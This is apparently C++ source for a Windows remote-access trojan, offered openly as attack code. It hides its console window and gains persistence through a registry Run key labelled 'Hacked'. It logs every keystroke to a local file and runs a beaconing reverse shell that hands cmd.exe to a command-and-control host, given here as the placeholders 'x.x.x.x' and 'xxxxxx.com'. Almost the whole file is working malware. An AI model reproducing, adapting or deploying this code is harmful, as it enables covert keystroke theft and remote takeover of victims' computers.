
#include "stdafx.h"
#include <stdio.h>
#include<iostream>
#define WIN32_LEAN_AND_MEAN  //WIN32_LEAN_AND_MEAN  excludes APIs such as Cryptography, DDE, RPC, Shell, and Windows Sockets(winsock)
#include <winsock2.h>        //contain all socket functions
#include <windows.h>         //contains declarations for all of the functions in the Windows API,
#include <ws2tcpip.h>
#include<winuser.h>
#include <thread>


#pragma comment(lib, "Ws2_32.lib")  
/*we use pargma to inform the compiler to statically compile this library into the executable.
Without this, our executable won’t run in any machine unless they have Microsoft Visual C/C++
redistributable installed in their system.Since, we can’t be sure of this, we will link this library statically
inside the executable instead of linking it dynamically so that it runs i.n every machine*/

#define DEFAULT_BUFLEN 1024
using namespace std;

void RunShell(char*, int);
int bootRun();
void persistence();
int SaveLogs(int key_stroke, char *file);
void Stealth();
void keylogger();

int main(int argc, char **argv)
{
	Stealth();
	bootRun();
	FreeConsole();  //disable the console window so that it is not visible to the user

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		thread th1(RunShell, argv[1], port);
		th1.detach();
	}
	else
	{
		thread th2(keylogger);
		th2.detach();

		char host[] = "x.x.x.x";
		int port = 0000;
		thread th1(RunShell, host, port);
		th1.join();



	}

	system("PAUSE"); // Here we say that the systems have to wait before exiting.
	return 0;
}

void keylogger()
{
	cout << "keylogger";
	char i;
	char msg[] = "MYLOGS.txt";

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				SaveLogs(i, msg); 
			}

		}
	}

}

void RunShell(char* C2Server, int C2Port){
	while (1) {
		Sleep(5000);    // 1000 = One Second		This is called as beaconing.
		SOCKET mySocket;

		struct sockaddr_in addr;
		struct in_addr addr2;

		WSADATA version;                        // structure contains information about the Windows Sockets implementation.
		WSAStartup(MAKEWORD(2, 2), &version);  // function initiates use of the Winsock DLL by a process.

		//get host by name
		struct hostent *hstnm;
		char *host_name = "xxxxxx.com";
		hstnm = gethostbyname(host_name);

		int i = 0;
		if (hstnm->h_addrtype == AF_INET)
		{
			while (hstnm->h_addr_list[i] != 0) {
				addr2.s_addr = *(u_long *)hstnm->h_addr_list[i++];
				printf("\tIP Address #%d: %s\n", i, inet_ntoa(addr2));
			}
		}
		char *address = inet_ntoa(addr2);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(address);  //IP received from main function
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);     //Port received from main function
		printf("ip %d",C2Server);
		printf(" port %d",C2Port);
				
		//Connecting to Proxy/ProxyIP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			printf("error connection          ");
			int a = WSAGetLastError();
			printf("%d          ", a);
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else {
			printf("error to recieve");
			char senddata[DEFAULT_BUFLEN] = "new connection";
			send(mySocket, senddata, strlen(senddata), 0);
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else {
				wchar_t Process[50] = L"cmd.exe";
				STARTUPINFO sinfo;   //contains details as to what all things should be taken care of before the process starts
				PROCESS_INFORMATION pinfo;   //contains details about the new process,parent process, its child process, other threads and how it will function
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}
	}
}

int SaveLogs(int key_stroke, char *file)   // Here we define our SaveLogs function.
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a");

	cout << key_stroke << endl;

	if (key_stroke == 8)  // The numbers stands for the ascii value of a character
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "\n");
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

int bootRun()
{

	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		printf("no persistence 1");
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		printf("no persistence 2");
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		printf("no persistence 3");
		return -1;
	}
	RegCloseKey(NewVal);
	printf("persistence done");
	return 0;
}
